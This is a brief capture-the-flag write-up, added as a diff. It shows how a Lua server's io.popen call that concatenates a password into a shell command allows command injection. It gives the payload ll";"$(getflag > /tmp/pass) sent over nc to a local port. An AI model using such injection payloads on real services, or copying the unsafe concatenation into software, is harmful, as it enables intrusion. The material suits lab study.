@@ -1,0 +1,11 @@
+in the server running in level11 The Lua function io.popen("echo "..pass.." | sha1sum", "r") executes a shell command that calculates the SHA-1 hash of the pass variable
+
+using: nc 127.0.0.1 5151 to connect to the server
+
+we can inject a command in tha pass variable
+
+password: ll";"$(getflag > /tmp/pass)
+
+Erf nope..
+
+cat /tmp/pass will give us the flag
